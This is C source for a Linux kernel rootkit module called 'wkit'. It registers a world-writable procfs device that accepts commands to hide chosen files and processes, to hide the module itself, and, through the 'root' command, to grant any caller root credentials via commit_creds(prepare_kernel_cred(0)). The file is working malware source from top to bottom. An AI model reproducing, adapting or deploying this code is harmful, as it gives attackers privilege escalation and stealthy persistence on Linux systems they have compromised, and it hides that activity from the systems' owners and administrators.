#include <linux/module.h>       
#include <linux/kernel.h>       
#include <linux/proc_fs.h>      
#include <linux/uaccess.h>
#include <linux/slab.h>

#include "util.h"
#include "debug.h"
#include "config.h"
#include "options.h"

// procfs device for userland com
struct proc_dir_entry *procf;
static char *cmd, *res = NULL;

// usum (unique sum)
char usum[USUM_LEN+1];
char cfgdev_name[USUM_LEN+20];
char cfgdev_path[USUM_LEN+30];

// some config options
int client_signal;
bool in_debug = DEBUG;

// lists for keeping track of files and processes
struct File *files = NULL;
int files_count = 0;
struct Process *procs = NULL;
int procs_count = 0;

// checks if the current proccess is a client
bool check_client(){
	pid_t curpid = task_pid_nr(current);
	int i = 0;
	
	if(procs_count == 0 || procs == NULL)
		return false;

	for(;i<procs_count;i++){
		if(procs[i].pid == curpid && procs[i].is_client)
			return true;
	}

	return false;
}

// checks if the specified file is hidden or not
bool check_file(char* path){
	char procfp[20];
	char procp[20];
	int i = 0;

	if(!in_debug && contains(path, usum)){
		return true;
	}

	if(files != NULL && files_count != 0){
		for(; i < files_count; i++){
			if(!files[i].hidden) continue;
			if(eq(files[i].path, path)) return true;
		}
	}
	
	if(procs != NULL || procs_count != 0){
		i = 0;
		for(; i < procs_count; i++){
			if(!procs[i].hidden && !procs[i].is_client) continue;
			sprintf(procfp, "/proc/%d", procs[i].pid);
			sprintf(procp, "%d", procs[i].pid);
			if(eq(procfp, path)) return true;
			if(eq(procp, path)) return true;
		}
	}

	return false;
}

// adds the given process to the list
bool add_proc(char* arg, bool client){	
	int i = 0;
	unsigned int pid;
	struct Process p;

	if(kstrtouint(arg, 10, &pid)!=0){
		return false;
	}  
	
	p.pid = pid;
	p.hidden = true;
	p.is_client = client;

	if(procs == NULL){
		procs = kmalloc(sizeof(struct Process), GFP_KERNEL);
		if(procs == NULL) return false;
		procs[procs_count] = p; 
		procs_count++;
		print("allocated new process list: %d", pid);
		return true;
	}

	for(; i<procs_count; i++){
		if(procs[i].pid == pid){
			procs[i].hidden = !procs[i].hidden;
			print("updated previous process: %d", pid);
			return true;
		}
	}
			
	procs = krealloc(procs, sizeof(struct Process)*(procs_count+1), GFP_KERNEL);
	if(procs == NULL) return false;
	procs[procs_count] = p; 
	procs_count++;
	print("added new process: %d", pid);
	return true;
}

// adds the given file to the list
bool add_file(char* arg){	
	int i = 0;
	struct File f;

	f.hidden = true;
	strcpy(f.path, arg);

	if(files == NULL){
		files = kmalloc(sizeof(struct File), GFP_KERNEL);
		if(files == NULL) return false;
		files[files_count] = f; 
		files_count++;
		print("allocated new file list: %s", arg);
		return true;
	}

	for(; i<files_count; i++){
		if(eq(files[i].path, arg)){
			files[i].hidden = !files[i].hidden;
			print("updated previous file: %s", arg);
			return true;
		}
	}
			
	files = krealloc(files, sizeof(struct File)*(files_count+1), GFP_KERNEL);
	if(files == NULL) return false;
	files[files_count] = f; 
	files_count++;
	print("added new file: %s", arg);
	return true;
}

// parses given command and calls the releated function
void parse_cmd(void){
	char func[CMD_MAX], arg[CMD_MAX];
	bool found_func = false;
	int ci = 0, fi = 0, ai = 0;

	func[fi] = '\0';
	arg[ai] = '\0';

	if(cmd == NULL){
		return;
	}

	for(; ci < strlen(cmd); ci++){
		if(found_func){
			arg[ai] = cmd[ci]; ai++;
			arg[ai] = '\0';
			continue;
		}

		if(cmd[ci] == ' '){
			found_func = true;
			continue;
		}

		func[fi] = cmd[ci];	fi++;
		func[fi] = '\0';
	}

	if(strlen(func) <= 0 && strlen(arg) <= 0){
		res = RES_BAD;
		goto END;
	}
	
	res = RES_OK;
	
	// file <path>
	if(eq(func, "file")){
		if(!add_file(arg)) res = RES_BAD; 
		goto END;
	}

	// proc <pid>
	else if(eq(func, "proc")){
		if(!add_proc(arg, false)) res = RES_BAD; 
		goto END;
	}

	// debug <>
	else if(eq(func, "debug")){
		in_debug = !in_debug;
		if(in_debug) showself();
		else hideself();
		goto END;
	}

	// root <>
	else if(eq(func, "root")){
		commit_creds(prepare_kernel_cred(0));
		goto END;
	}
	
	print("unknown command: %s", func);
	res = RES_NOTFOUND;

END:
	kfree(cmd);
}

// procfs device read function, returns the last command response
// if the client did not run any commands returns RES_EMPTY
static ssize_t procf_read(
		struct file *file, char __user *buffer, size_t count, loff_t *offset){
	int len;
	if(res == NULL){
		res = RES_EMPTY;
	}

	len = sizeof(res); 
	if(*offset >= len || copy_to_user(buffer, res, len)) { 
		return 0; 
	}
		
	*offset += len;
	print("procf_read: returning '%s'", res);
	return len; 
}

// procfs device write funtion, reads the command and gives it to the
// parse_cmd function so it can parsed
static ssize_t procf_write(
		struct file *file, const char __user *buffer, size_t count, loff_t *offset){
	print("procf_write: got %d bytes", count);
	if(count > CMD_MAX){
		print("procf_write: ignoring command, larger then the limit %d)", count, CMD_MAX);
		return -1;
	}

	cmd = kmalloc(count+1, GFP_KERNEL);
	if (cmd == NULL){
		print("procf_write: cannot allocate command buffer");
		return -1;
	}

	if(copy_from_user(cmd, buffer, count)){
		print("procf_write: copy_from_user failed");
		return -1;
	}

	print("procf_write: read '%s'", cmd);	
	parse_cmd();
	return count;
}

// procfs device open function
static int procf_open(struct inode *inode, struct file *file){ 
	try_module_get(THIS_MODULE);
	return 0;
} 

// procfs device close function
static int procf_close(struct inode *inode, struct file *file) { 
	module_put(THIS_MODULE);
	return 0; 
} 

// all procfs device functions
static struct proc_ops ops = {
	.proc_read = procf_read,
	.proc_write = procf_write,
	.proc_open = procf_open,
	.proc_release = procf_close,
};

// creates the procfs device
bool create_cfg(){
	if(strlen(USUM)!=USUM_LEN){
		print("bad usum, using the default instead: %s", DEF_USUM);
		strcpy(usum, DEF_USUM);
	}else strcpy(usum, USUM);

	if(SIGNAL<=0){
		print("bad signal, using the default instead: %d", DEF_SIGNAL);
		client_signal = DEF_SIGNAL;
	}else client_signal = SIGNAL;

	sprintf(cfgdev_name, "wkit_dev%s", usum);
	print(cfgdev_name);
	sprintf(cfgdev_path, "/proc/%s", cfgdev_name);

	procf = proc_create(cfgdev_name, 0666, NULL, &ops);
	if(procf == NULL){
		print("cannot create procfs device");
		remove_proc_entry(cfgdev_name, NULL);
		return false;
	} 
	
	add_file("wkit.ko");
	print("created procfs device: %s", cfgdev_path);
	return true;
}

// cleans the procfs device
void clean_cfg(){
	if(files != NULL) kfree(files);
	if(procs != NULL) kfree(procs);
	remove_proc_entry(cfgdev_name, NULL);
	print("removed procfs device");
}
